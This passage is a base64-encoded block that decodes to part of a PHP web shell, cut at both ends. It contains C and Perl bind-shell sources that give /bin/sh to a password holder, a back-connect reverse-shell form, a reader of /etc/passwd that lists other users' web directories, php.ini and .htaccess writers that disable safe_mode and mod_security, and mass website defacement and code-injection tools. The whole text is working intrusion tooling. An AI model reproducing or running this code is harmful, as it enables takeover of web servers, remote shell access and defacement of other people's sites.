NWpiSFZrWlNBOGJtVjBaR0l1YUQ0TkNpTnBibU5zZFdSbElEeHpkR1JzYVdJdWFENE5DbWx1ZENCdFlXbHVLR2x1ZENCaGNtZGpMQ0JqYUdGeUlDb3FZWEpuZGlrZ2V3MEtJQ0FnSUdsdWRDQnpMR01zYVRzTkNpQWdJQ0JqYUdGeUlIQmJNekJkT3cwS0lDQWdJSE4wY25WamRDQnpiMk5yWVdSa2NsOXBiaUJ5T3cwS0lDQWdJR1JoWlcxdmJpZ3hMREFwT3cwS0lDQWdJSE1nUFNCemIyTnJaWFFvUVVaZlNVNUZWQ3hUVDBOTFgxTlVVa1ZCVFN3d0tUc05DaUFnSUNCcFppZ2hjeWtnY21WMGRYSnVJQzB4T3cwS0lDQWdJSEl1YzJsdVgyWmhiV2xzZVNBOUlFRkdYMGxPUlZRN0RRb2dJQ0FnY2k1emFXNWZjRzl5ZENBOUlHaDBiMjV6S0dGMGIya29ZWEpuZGxzeFhTa3BPdzBLSUNBZ0lISXVjMmx1WDJGa1pISXVjMTloWkdSeUlEMGdhSFJ2Ym13b1NVNUJSRVJTWDBGT1dTazdEUW9nSUNBZ1ltbHVaQ2h6TENBb2MzUnlkV04wSUhOdlkydGhaR1J5SUNvcEpuSXNJREI0TVRBcE93MEtJQ0FnSUd4cGMzUmxiaWh6TENBMUtUc05DaUFnSUNCM2FHbHNaU2d4S1NCN0RRb2dJQ0FnSUNBZ0lHTTlZV05qWlhCMEtITXNNQ3d3S1RzTkNpQWdJQ0FnSUNBZ1pIVndNaWhqTERBcE93MEtJQ0FnSUNBZ0lDQmtkWEF5S0dNc01TazdEUW9nSUNBZ0lDQWdJR1IxY0RJb1l5d3lLVHNOQ2lBZ0lDQWdJQ0FnZDNKcGRHVW9ZeXdpVUdGemMzZHZjbVE2SWl3NUtUc05DaUFnSUNBZ0lDQWdjbVZoWkNoakxIQXNjMmw2Wlc5bUtIQXBLVHNOQ2lBZ0lDQWdJQ0FnWm05eUtHazlNRHRwUEhOMGNteGxiaWh3S1R0cEt5c3BEUW9nSUNBZ0lDQWdJQ0FnSUNCcFppZ2dLSEJiYVYwZ1BUMGdKMXh1SnlrZ2ZId2dLSEJiYVYwZ1BUMGdKMXh5SnlrZ0tRMEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lIQmJhVjBnUFNBblhEQW5PdzBLSUNBZ0lDQWdJQ0JwWmlBb2MzUnlZMjF3S0dGeVozWmJNbDBzY0NrZ1BUMGdNQ2tOQ2lBZ0lDQWdJQ0FnSUNBZ0lITjVjM1JsYlNnaUwySnBiaTl6YUNBdGFTSXBPdzBLSUNBZ0lDQWdJQ0JqYkc5elpTaGpLVHNOQ2lBZ0lDQjlEUXA5IjsKICAgICRiaW5kX3BvcnRfcCAgICA9ICJJeUV2ZFhOeUwySnBiaTl3WlhKc0RRb2tVMGhGVEV3OUlpOWlhVzR2YzJnZ0xXa2lPdzBLYVdZZ0tFQkJVa2RXSUR3Z01Ta2dleUJsZUdsMEtERXBPeUI5RFFwMWMyVWdVMjlqYTJWME93MEtjMjlqYTJWMEtGTXNKbEJHWDBsT1JWUXNKbE5QUTB0ZlUxUlNSVUZOTEdkbGRIQnliM1J2WW5sdVlXMWxLQ2QwWTNBbktTa2dmSHdnWkdsbElDSkRZVzUwSUdOeVpXRjBaU0J6YjJOclpYUmNiaUk3RFFwelpYUnpiMk5yYjNCMEtGTXNVMDlNWDFOUFEwdEZWQ3hUVDE5U1JWVlRSVUZFUkZJc01TazdEUXBpYVc1a0tGTXNjMjlqYTJGa1pISmZhVzRvSkVGU1IxWmJNRjBzU1U1QlJFUlNYMEZPV1NrcElIeDhJR1JwWlNBaVEyRnVkQ0J2Y0dWdUlIQnZjblJjYmlJN0RRcHNhWE4wWlc0b1V5d3pLU0I4ZkNCa2FXVWdJa05oYm5RZ2JHbHpkR1Z1SUhCdmNuUmNiaUk3RFFwM2FHbHNaU2d4S1NCN0RRb0pZV05qWlhCMEtFTlBUazRzVXlrN0RRb0phV1lvSVNna2NHbGtQV1p2Y21zcEtTQjdEUW9KQ1dScFpTQWlRMkZ1Ym05MElHWnZjbXNpSUdsbUlDZ2haR1ZtYVc1bFpDQWtjR2xrS1RzTkNna0piM0JsYmlCVFZFUkpUaXdpUENaRFQwNU9JanNOQ2drSmIzQmxiaUJUVkVSUFZWUXNJajRtUTA5T1RpSTdEUW9KQ1c5d1pXNGdVMVJFUlZKU0xDSStKa05QVGs0aU93MEtDUWxsZUdWaklDUlRTRVZNVENCOGZDQmthV1VnY0hKcGJuUWdRMDlPVGlBaVEyRnVkQ0JsZUdWamRYUmxJQ1JUU0VWTVRGeHVJanNOQ2drSlkyeHZjMlVnUTA5T1Rqc05DZ2tKWlhocGRDQXdPdzBLQ1gwTkNuMD0iOwogICAgCiAgICBlY2hvICc8aDE+TmV0d29yayB0b29sczwvaDE+PGRpdiBjbGFzcz1jb250ZW50PgogICAgPGZvcm0gbmFtZT1cJ25mcFwnIG9uU3VibWl0PSJnKG51bGwsbnVsbCx0aGlzLnVzaW5nLnZhbHVlLHRoaXMucG9ydC52YWx1ZSx0aGlzLnBhc3MudmFsdWUpO3JldHVybiBmYWxzZTsiPgogICAgPGJyIC8+PHNwYW4+QmluZCBwb3J0IHRvIC9iaW4vc2g8L3NwYW4+PGJyLz4KICAgIFBvcnQ6IDxpbnB1dCB0eXBlPVwndGV4dFwnIG5hbWU9XCdwb3J0XCcgdmFsdWU9XCc0NDNcJz4gUGFzc3dvcmQ6IDxpbnB1dCB0eXBlPVwndGV4dFwnIG5hbWU9XCdwYXNzXCcgdmFsdWU9XCdTZWN1cmVQVyFcJz4gVXNpbmc6IDxzZWxlY3QgbmFtZT0idXNpbmciPjxvcHRpb24gdmFsdWU9XCdicGNcJz5DPC9vcHRpb24+PG9wdGlvbiB2YWx1ZT1cJ2JwcFwnPlBlcmw8L29wdGlvbj48L3NlbGVjdD4gPGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSI+PiI+CiAgICA8L2Zvcm0+CiAgICA8Zm9ybSBuYW1lPVwnbmZwXCcgb25TdWJtaXQ9ImcobnVsbCxudWxsLHRoaXMudXNpbmcudmFsdWUsdGhpcy5zZXJ2ZXIudmFsdWUsdGhpcy5wb3J0LnZhbHVlKTtyZXR1cm4gZmFsc2U7Ij4KICAgIDxiciAvPjxiciAvPjxzcGFuPkJhY2stY29ubmVjdCB0bzwvc3Bhbj48YnIvPgogICAgU2VydmVyOiA8aW5wdXQgdHlwZT1cJ3RleHRcJyBuYW1lPVwnc2VydmVyXCcgdmFsdWU9IicgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICciPiBQb3J0OiA8aW5wdXQgdHlwZT1cJ3RleHRcJyBuYW1lPVwncG9ydFwnIHZhbHVlPVwnNDQzXCc+IFVzaW5nOiA8c2VsZWN0IG5hbWU9InVzaW5nIj48b3B0aW9uIHZhbHVlPVwnYmNjXCc+Qzwvb3B0aW9uPjxvcHRpb24gdmFsdWU9XCdiY3BcJz5QZXJsPC9vcHRpb24+PC9zZWxlY3Q+IDxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iPj4iPgogICAgPC9mb3JtPjxicj4nOwogICAgaWYgKGlzc2V0KCRfUE9TVFsncDEnXSkpIHsKICAgICAgICBmdW5jdGlvbiBjZigkZiwgJHQpCiAgICAgICAgewogICAgICAgICAgICAkdyA9IEBmb3BlbigkZiwgInciKSBvciBAZnVuY3Rpb25fZXhpc3RzKCdmaWxlX3B1dF9jb250ZW50cycpOwogICAgICAgICAgICBpZiAoJHcpIHsKICAgICAgICAgICAgICAgIEBmd3JpdGUoJHcsIEBiYXNlNjRfZGVjb2RlKCR0KSkgb3IgQGZwdXRzKCR3LCBAYmFzZTY0X2RlY29kZSgkdCkpIG9yIEBmaWxlX3B1dF9jb250ZW50cygkZiwgQGJhc2U2NF9kZWNvZGUoJHQpKTsKICAgICAgICAgICAgICAgIEBmY2xvc2UoJHcpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmICgkX1BPU1RbJ3AxJ10gPT0gJ2JwYycpIHsKICAgICAgICAgICAgY2YoIi90bXAvYnAuYyIsICRiaW5kX3BvcnRfYyk7CiAgICAgICAgICAgICRvdXQgPSBleCgiZ2NjIC1vIC90bXAvYnAgL3RtcC9icC5jIik7CiAgICAgICAgICAgIEB1bmxpbmsoIi90bXAvYnAuYyIpOwogICAgICAgICAgICAkb3V0IC49IGV4KCIvdG1wL2JwICIgLiAkX1BPU1RbJ3AyJ10gLiAiICIgLiAkX1BPU1RbJ3AzJ10gLiAiICYiKTsKICAgICAgICAgICAgZWNobyAiPHByZSBjbGFzcz1tbDE+JG91dFxuIiAuIGV4KCJwcyBhdXggfCBncmVwIGJwIikgLiAiPC9wcmU+IjsKICAgICAgICB9CiAgICAgICAgaWYgKCRfUE9TVFsncDEnXSA9PSAnYnBwJykgewogICAgICAgICAgICBjZigiL3RtcC9icC5wbCIsICRiaW5kX3BvcnRfcCk7CiAgICAgICAgICAgICRvdXQgPSBleCh3aGljaCgicGVybCIpIC4gIiAvdG1wL2JwLnBsICIgLiAkX1BPU1RbJ3AyJ10gLiAiICYiKTsKICAgICAgICAgICAgZWNobyAiPHByZSBjbGFzcz1tbDE+JG91dFxuIiAuIGV4KCJwcyBhdXggfCBncmVwIGJwLnBsIikgLiAiPC9wcmU+IjsKICAgICAgICB9CiAgICAgICAgaWYgKCRfUE9TVFsncDEnXSA9PSAnYmNjJykgewogICAgICAgICAgICBjZigiL3RtcC9iYy5jIiwgJGJhY2tfY29ubmVjdF9jKTsKICAgICAgICAgICAgJG91dCA9IGV4KCJnY2MgLW8gL3RtcC9iYyAvdG1wL2JjLmMiKTsKICAgICAgICAgICAgQHVubGluaygiL3RtcC9iYy5jIik7CiAgICAgICAgICAgICRvdXQgLj0gZXgoIi90bXAvYmMgIiAuICRfUE9TVFsncDInXSAuICIgIiAuICRfUE9TVFsncDMnXSAuICIgJiIpOwogICAgICAgICAgICBlY2hvICI8cHJlIGNsYXNzPW1sMT4kb3V0XG4iIC4gZXgoInBzIGF1eCB8IGdyZXAgYmMiKSAuICI8L3ByZT4iOwogICAgICAgIH0KICAgICAgICBpZiAoJF9QT1NUWydwMSddID09ICdiY3AnKSB7CiAgICAgICAgICAgIGNmKCIvdG1wL2JjLnBsIiwgJGJhY2tfY29ubmVjdF9wKTsKICAgICAgICAgICAgJG91dCA9IGV4KHdoaWNoKCJwZXJsIikgLiAiIC90bXAvYmMucGwgIiAuICRfUE9TVFsncDInXSAuICIgIiAuICRfUE9TVFsncDMnXSAuICIgJiIpOwogICAgICAgICAgICBlY2hvICI8cHJlIGNsYXNzPW1sMT4kb3V0XG4iIC4gZXgoInBzIGF1eCB8IGdyZXAgYmMucGwiKSAuICI8L3ByZT4iOwogICAgICAgIH0KICAgIH0KICAgIGVjaG8gJzwvZGl2Pic7CiAgICBwcmludEZvb3RlcigpOwp9CgoKZnVuY3Rpb24gYWN0aW9uUmVhZGFibGUoKQp7CiAgICBwcmludEhlYWRlcigpOwogICAgZWNobyAnPGgxPlJlYWRhYmxlIERpcnM8L2gxPic7CiAgICBlY2hvICc8ZGl2IGNsYXNzPSJjb250ZW50Ij4nOwogICAgJHNtID0gaW5pX2dldCgnc2FmZV9tb2RlJyk7CiAgICBpZiAoJHNtKSB7CiAgICAgICAgZWNobyAnPGJyIC8+PGI+RXJyb3I6IHNhZmVfbW9kZSA9IG9uPC9iPjxiciAvPjxiciAvPic7CiAgICB9IGVsc2UgewogICAgICAgIEAkcGFzc3dkID0gZmlsZSgnL2V0Yy9wYXNzd2QnLCAncicpOwogICAgICAgIGlmICghJHBhc3N3ZCkgewogICAgICAgICAgICBlY2hvICc8YnIgLz48Yj5bLV0gRXJyb3IgOiBjb3VkbmB0IHJlYWQgL2V0Yy9wYXNzd2Q8L2I+PGJyIC8+PGJyIC8+JzsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkcHViICAgPSBhcnJheSgpOwogICAgICAgICAgICAkdXNlcnMgPSBhcnJheSgpOwogICAgICAgICAgICAkY29uZiAgPSBhcnJheSgpOwogICAgICAgICAgICAkaSAgICAgPSAwOwogICAgICAgICAgICBmb3JlYWNoICgkcGFzc3dkIGFzICRwKSB7CiAgICAgICAgICAgICAgICAkciAgICA9IGV4cGxvZGUoJzonLCAkcCk7CiAgICAgICAgICAgICAgICAkZGlyeiA9ICRyWzVdIC4gJy9wdWJsaWNfaHRtbC8nOwogICAgICAgICAgICAgICAgaWYgKHN0cnBvcygkcls1XSwgJ2hvbWUnKSkgewogICAgICAgICAgICAgICAgICAgIGFycmF5X3B1c2goJHVzZXJzLCAkclswXSk7CiAgICAgICAgICAgICAgICAgICAgaWYgKGlzX3JlYWRhYmxlKCRkaXJ6KSkgewogICAgICAgICAgICAgICAgICAgICAgICBhcnJheV9wdXNoKCRwdWIsICRkaXJ6KTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWNobyAnPGJyPjxicj4nOwogICAgICAgICAgICBlY2hvICJbK10gRm91bmRlZCAiIC4gc2l6ZW9mKCR1c2VycykgLiAiIGVudHJ5cyBpbiAvZXRjL3Bhc3N3ZFxuIiAuICI8YnIgLz4iOwogICAgICAgICAgICBlY2hvICJbK10gRm91bmRlZCAiIC4gc2l6ZW9mKCRwdWIpIC4gIiByZWFkYWJsZSBwdWJsaWNfaHRtbCBkaXJlY3Rvcmllc1xuIiAuICI8YnIgLz48YnIgLz48YnIgLz4iOwogICAgICAgICAgICBmb3JlYWNoICgkcHViIGFzICR1c2VyKSB7CiAgICAgICAgICAgICAgICBlY2hvICR1c2VyIC4gIjxicj4iOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVjaG8gIjxiciAvPjxiciAvPjxiciAvPlsrXSBDb21wbGV0ZS4uLlxuIiAuICI8YnIgLz4iOwogICAgICAgIH0KICAgIH0KICAgIGVjaG8gJzwvZGl2Pic7CiAgICBwcmludEZvb3RlcigpOwp9CgpmdW5jdGlvbiBhY3Rpb25CeXBhc3MoKQp7CiAgICBwcmludEhlYWRlcigpOwogICAgZWNobyAnPGgxPlNhZmUgTW9kZTwvaDE+JzsKICAgIGVjaG8gJzxkaXYgY2xhc3M9ImNvbnRlbnQiPic7CiAgICBlY2hvICI8ZGl2IGNsYXNzPWhlYWRlcj48Y2VudGVyPjxoMz48c3Bhbj58IFNBRkUgTU9ERSBBTkQgTU9EIFNFQ1VSSVRZIERJU0FCTEVEIEFORCBQRVJMIDUwMCBJTlRFUk5BTCBFUlJPUiBCWVBBU1MgfDwvc3Bhbj48L2gzPkZvbGxvd2luZyBwaHAuaW5pIGFuZCAuaHRhY2Nlc3MobW9kKSBhbmQgcGVybCguaHRhY2Nlc3MpW2NvbnZlcnQgcGVybCBleHRlbnRpb24gKi5wbCA9PiAqLnNoICBdIGZpbGVzIGNyZWF0ZSBpbiBmb2xsb3dpbmcgZGlyPGJyPnwgIiAuICRHTE9CQUxTWydjd2QnXSAuICIgfDxicj48YnIgLz4iOwogICAgZWNobyAnPGEgaHJlZj0jIG9uY2xpY2s9ImcobnVsbCxudWxsLFwncGhwLmluaVwnLG51bGwpIj58IFBIUC5JTkkgfCA8L2E+PGEgaHJlZj0jIG9uY2xpY2s9ImcobnVsbCxudWxsLG51bGwsXCdpbmlcJykiPnwgLmh0YWNjZXNzKE1vZCkgfCA8L2E+PGEgaHJlZj0jIG9uY2xpY2s9ImcobnVsbCxudWxsLG51bGwsbnVsbCxcJ3NoXCcpIj58IC5odGFjY2VzcyhwZXJsKSB8IDwvYT48L2NlbnRlcj4nOwogICAgaWYgKCFlbXB0eSgkX1BPU1RbJ3AyJ10pICYmIGlzc2V0KCRfUE9TVFsncDInXSkpIHsKICAgICAgICAkZmlsID0gZm9wZW4oJEdMT0JBTFNbJ2N3ZCddIC4gIi5odGFjY2VzcyIsICJ3Iik7CiAgICAgICAgZndyaXRlKCRmaWwsICc8SWZNb2R1bGUgbW9kX3NlY3VyaXR5LmM+CiAgICAgICAgICAgIFNlYy0tLS0tLUVuZ2luZSBPZmYKICAgICAgICAgICAgU2VjLS0tLS0tU2NhblBPU1QgT2ZmCiAgICAgICAgICAgIDwvSWZNb2R1bGU+Jyk7CiAgICAgICAgZmNsb3NlKCRmaWwpOwogICAgfQogICAgaWYgKCFlbXB0eSgkX1BPU1RbJ3AxJ10pICYmIGlzc2V0KCRfUE9TVFsncDEnXSkpIHsKICAgICAgICAkZmlsID0gZm9wZW4oJEdMT0JBTFNbJ2N3ZCddIC4gInBocC5pbmkiLCAidyIpOwogICAgICAgIGZ3cml0ZSgkZmlsLCAnc2FmZV9tb2RlPU9GRgogICAgICAgICAgICBkaXNhYmxlX2Z1bmN0aW9ucz1OT05FJyk7CiAgICAgICAgZmNsb3NlKCRmaWwpOwogICAgfQogICAgaWYgKCFlbXB0eSgkX1BPU1RbJ3AzJ10pICYmIGlzc2V0KCRfUE9TVFsncDMnXSkpIHsKICAgICAgICAkZmlsID0gZm9wZW4oJEdMT0JBTFNbJ2N3ZCddIC4gIi5odGFjY2VzcyIsICJ3Iik7CiAgICAgICAgZndyaXRlKCRmaWwsICdPcHRpb25zIEZvbGxvd1N5bUxpbmtzIE11bHRpVmlld3MgSW5kZXhlcyBFeGVjQ0dJCiAgICAgICAgQWRkVHlwZSBhcHBsaWNhdGlvbi94LWh0dHBkLWNnaSAuc2gKICAgICAgICBBZGRIYW5kbGVyIGNnaS1zY3JpcHQgLnBsCiAgICAgICAgQWRkSGFuZGxlciBjZ2ktc2NyaXB0IC5wbCcpOwogICAgICAgIGZjbG9zZSgkZmlsKTsKICAgIH0KICAgIGVjaG8gIjxicj48YnIgLz48YnIgLz48L2Rpdj4iOwogICAgZWNobyAnPC9kaXY+JzsKICAgIHByaW50Rm9vdGVyKCk7CiAgICAKfQoKZnVuY3Rpb24gYWN0aW9uRGVmYWNlKCkKewogICAgcHJpbnRIZWFkZXIoKTsKICAgIGVjaG8gIjxoMT5NYXNzIERlZmFjZXIgYnkgU21Fdks8L2gxPjxkaXYgY2xhc3M9Y29udGVudD4iOwo/Pgo8Zm9ybSBFTkNUWVBFPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBhY3Rpb249Ijw/CiAgICAkX1NFUlZFUlsnUEhQX1NFTEYnXTsKPz4iIG1ldGhvZD1QT1NUIG9uU3VibWl0PSJnKG51bGwsbnVsbCx0aGlzLnBhdGgudmFsdWUsdGhpcy5maWxlLnZhbHVlLHRoaXMuQ29udGVudHMudmFsdWUpO3JldHVybiBmYWxzZTsiPgo8cCBhbGlnbj0iTGVmdCI+Rm9sZGVyOiA8aW5wdXQgdHlwZT10ZXh0IG5hbWU9cGF0aCBzaXplPTYwIHZhbHVlPSI8Pz0gZ2V0Y3dkKCk7ID8+Ij4KPGJyPmZpbGUgbmFtZSA6IDxpbnB1dCB0eXBlPXRleHQgbmFtZT1maWxlIHNpemU9MjAgdmFsdWU9ImluZGV4LnBocCI+Cjxicj5UZXh0IENvbnRlbnQgOiA8aW5wdXQgdHlwZT10ZXh0IG5hbWU9Q29udGVudHMgc2l6ZT03MCB2YWx1ZT0iQWRkIHlvdXIgZGVmYWNlIHR4dCBoZXJlIj4gCjxicj48aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9IkRlZmFjZSBub3ciPjwvcD48L2Zvcm0+Cgo8P3BocAogICAgaWYgKCRfUE9TVFsnYSddID09ICdEZWZhY2UnKSB7CiAgICAgICAgJG1haW5wYXRoICAgID0gJF9QT1NUW3AxXTsKICAgICAgICAkZmlsZSAgICAgICAgPSAkX1BPU1RbcDJdOwogICAgICAgICR0eHRDb250ZW50cyA9ICRfUE9TVFtwM107CiAgICAgICAgZWNobyAiTWFzcyBEZWZhY2VyIHNjcmlwdCBieSBTbUVWS19QYVRoQW4iOwogICAgICAgICRkaXIgPSBvcGVuZGlyKCRtYWlucGF0aCk7IC8vZml4bWUgLSBjYW5ub3QgZGVmYWNlIHdoZW4gY2hhbmdlIHRvIHdyaXRlYWJsZSBwYXRoISEKICAgICAgICB3aGlsZSAoJHJvdyA9IHJlYWRkaXIoJGRpcikpIHsKICAgICAgICAgICAgJHN0YXJ0ICA9IEBmb3BlbigiJHJvdy8kZmlsZSIsICJ3KyIpOwogICAgICAgICAgICAkY29kZSAgID0gJHR4dENvbnRlbnRzOwogICAgICAgICAgICAkZmluaXNoID0gQGZ3cml0ZSgkc3RhcnQsICRjb2RlKTsKICAgICAgICAgICAgaWYgKCRmaW5pc2gpIHsKICAgICAgICAgICAgICAgIGVjaG8gIiRyb3cvJGZpbGUgPiBEb25lPGJyPjxicj4iOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIAogICAgfQogICAgZWNobyAnPC9kaXY+JzsKICAgIHByaW50Rm9vdGVyKCk7Cn0KCmZ1bmN0aW9uIGFjdGlvbkluamVjdG9yKCkKewogICAgcHJpbnRIZWFkZXIoKTsKICAgIGVjaG8gJzxoMT5NYXNzIENvZGUgSW5qZWN0b3I8L2gxPic7CiAgICBlY2hvICc8ZGl2IGNsYXNzPSJjb250ZW50Ij4nOwogICAgCiAgICBpZiAoc3RyaXN0cihwaHBfdW5hbWUoKSwgIldpbmRvd3MiKSkgewogICAgICAgICREUyA9ICJcXCI7CiAgICB9IGVsc2UgaWYgKHN0cmlzdHIocGhwX3VuYW1lKCksICJMaW51eCIpKSB7CiAgICAgICAgJERTID0gJy8nOwogICAgfQogICAgZnVuY3Rpb24gZ2V0X3N0cnVjdHVyZSgkcGF0aCwgJGRlcHRoKQogICAgewogICAgICAgIGdsb2JhbCAkRFM7CiAgICAgICAgJHJlcyA9IGFycmF5KCk7CiAgICAgICAgaWYgKGluX2FycmF5KDAsICRkZXB0aCkpIHsKICAgICAgICAgICAgJHJlc1tdID0gJHBhdGg7CiAgICAgICAgfQogICAgICAgIGlmIChpbl9hcnJheSgxLCAkZGVwdGgpIG9yIGluX2FycmF5KDIsICRkZXB0aCkgb3IgaW5fYXJyYXkoMywgJGRlcHRoKSkgewogICAgICAgICAgICAkdG1wMSA9IGdsb2IoJHBhdGggLiAkRFMgLiAnKicsIEdMT0JfT05MWURJUik7CiAgICAgICAgICAgIGlmIChpbl9hcnJheSgxLCAkZGVwdGgpKSB7CiAgICAgICAgICAgICAgICAkcmVzID0gYXJyYXlfbWVyZ2UoJHJlcywgJHRtcDEpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmIChpbl9hcnJheSgyLCAkZGVwdGgpIG9yIGluX2FycmF5KDMsICRkZXB0aCkpIHsKICAgICAgICAgICAgJHRtcDIgPSBhcnJheSgpOwogICAgICAgICAgICBmb3JlYWNoICgkdG1wMSBhcyAkdCkgewogICAgICAgICAgICAgICAgJHRwMiAgPSBnbG9iKCR0IC4gJERTIC4gJyonLCBHTE9CX09OTFlESVIpOwogICAgICAgICAgICAgICAgJHRtcDIgPSBhcnJheV9tZXJnZSgkdG1wMiwgJHRwMik7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKGluX2FycmF5KDIsICRkZXB0aCkpIHsKICAgICAgICAgICAgICAgICRyZXMgPSBhcnJheV9tZXJnZSgkcmVzLCAkdG1wMik7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKGluX2FycmF5KDMsICRkZXB0aCkpIHsKICAgICAgICAgICAgJHRtcDMgPSBhcnJheSgpOwogICAgICAgICAgICBmb3JlYWNoICgkdG1wMiBhcyAkdCkgewogICAgICAgICAgICAgICAgJHRwMyAgPSBnbG9iKCR0IC4gJERTIC4gJyonLCBHTE9CX09OTFlESVIpOwogICAgICAgICAgICAgICAgJHRtcDMgPSBhcnJheV9tZXJnZSgkdG1wMywgJHRwMyk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJHJlcyA9IGFycmF5X21lcmdlKCRyZXMsICR0bXAzKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICRyZXM7CiAgICB9CiAgICAKICAgIGlmIChpc3NldCgkX1BPU1RbJ3N1Ym1pdCddKSAmJiAkX1BPU1RbJ3N1Ym1pdCddID09ICdJbmplY3QnKSB7CiAgICAgICAgJG5hbWUgID0gJF9QT1NUWyduYW1lJ10gPyAkX1BPU1RbJ25hbWUnXSA6ICcqJzsKICAgICAgICAkdHlwZSAgPSAkX1BPU1RbJ3R5cGUnXSA/ICRfUE9TVFsndHlwZSddIDogJ2h0bWwnOwogICAgICAgICRwYXRoICA9ICRfUE9TVFsncGF0aCddID8gJF9QT1NUWydwYXRoJ10gOiBnZXRjd2QoKTsKICAgICAgICAkY29kZSAgPSAkX1BPU1RbJ2NvZGUnXSA/ICRfUE9TVFsnY29kZSddIDogJ1Bha2lzdGFuIEhheG9ycyBDcmV3JzsKICAgICAgICAkbW9kZSAgPSAkX1BPU1RbJ21vZGUnXSA/ICRfUE9TVFsnbW9kZSddIDogJ2EnOwogICAgICAgICRkZXB0aCA9IHNpemVvZigkX1BPU1RbJ2RlcHRoJ10pID8gJF9QT1NUWydkZXB0aCddIDogYXJyYXkoCiAgICAgICAgICAgICcwJwogICAgICAgICk7CiAgICAgICAgJGR0ICAgID0gZ2V0X3N0cnVjdHVyZSgkcGF0aCwgJGRlcHRoKTsKICAgICAgICBmb3JlYWNoICgkZHQgYXMgJGQpIHsKICAgICAgICAgICAgaWYgKCRtb2RlID09ICdhJykgewogICAgICAgICAgICAgICAgaWYgKGZpbGVfcHV0X2NvbnRlbnRzKCRkIC4gJERTIC4gJG5hbWUgLiAnLicgLiAkdHlwZSwgJGNvZGUsIEZJTEVfQVBQRU5EKSkgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJzxkaXY+PHN0cm9uZz4nIC4gJGQgLiAkRFMgLiAkbmFtZSAuICcuJyAuICR0eXBlIC4gJzwvc3Ryb25nPjxzcGFuIHN0eWxlPSJjb2xvcjpsaW1lOyI+IHdhcyBpbmplY3RlZDwvc3Bhbj48L2Rpdj4nOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICc8ZGl2PjxzcGFuIHN0eWxlPSJjb2xvcjpyZWQ7Ij5mYWlsZWQgdG8gaW5qZWN0PC9zcGFuPiA8c3Ryb25nPicgLiAkZCAuICREUyAuICRuYW1lIC4gJy4nIC4gJHR5cGUgLiAnPC9zdHJvbmc+PC9kaXY+JzsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGlmIChmaWxlX3B1dF9jb250ZW50cygkZCAuICREUyAuICRuYW1lIC4gJy4nIC4gJHR5cGUsICRjb2RlKSkgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJzxkaXY+PHN0cm9uZz4nIC4gJGQgLiAkRFMgLiAkbmFtZSAuICcuJyAuICR0eXBlIC4gJzwvc3Ryb25nPjxzcGFuIHN0eWxlPSJjb2xvcjpsaW1lOyI+IHdhcyBpbmplY3RlZDwvc3Bhbj48L2Rpdj4nOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICc8ZGl2PjxzcGFuIHN0eWxlPSJjb2xvcjpyZWQ7Ij5mYWlsZWQgdG8gaW5qZWN0PC9zcGFuPiA8c3Ryb25nPicgLiAkZCAuICREUyAuICRuYW1lIC4gJy4nIC4gJHR5cGUgLiAnPC9zdHJvbmc+PC9kaXY+JzsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgICAgZWNobyAnPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+CiAgICAgICAgICAgICAgICA8dGFibGUgYWxpZ249ImNlbnRlciI+CiAgICAgICAgICAgICAgICAgICAgPHRyPgogICAgICAgICAgICAgICAgICAgICAgICA8dGQ+RGlyZWN0b3J5IDogPC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjxpbnB1dCBjbGFzcz0iYm94IiBuYW1lPSJwYXRoIiB2YWx1ZT0iJyAuIGdldGN3ZCgpIC4gJyIgc2l6ZT0iNTAiLz48L3RkPgogICAgICAgICAgICAgICAgICAgIDwvdHI+CiAgICAgICAgICAgICAgICAgICAgPHRyPgogICAgICAgICAgICAgICAgICAgICAgICA8dGQgY2xhc3M9InRpdGxlIj5Nb2RlIDogPC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPHRkPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNlbGVjdCBzdHlsZT0id2lkdGg6IDEwMHB4OyIgbmFtZT0ibW9kZSIgY2xhc3M9ImJveCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iYSI+QXBlbmRlcjwvb3B0aW9uPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxvcHRpb24gdmFsdWU9InciPk92ZXJ3cml0ZXI8L29wdGlvbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvc2VsZWN0PgogICAgICAgICAgICAgICAgICAgICAgICA8L3RkPgogICAgICAgICAgICAgICAgICAgIDwvdHI+CiAgICAgICAgICAgICAgICAgICAgPHRyPgogICAgICAgICAgICAgICAgICAgICAgICA8dGQgY2xhc3M9InRpdGxlIj5GaWxlIE5hbWUgJiBUeXBlIDogPC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPHRkPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIHN0eWxlPSJ3aWR0aDogMTAwcHg7IiBuYW1lPSJuY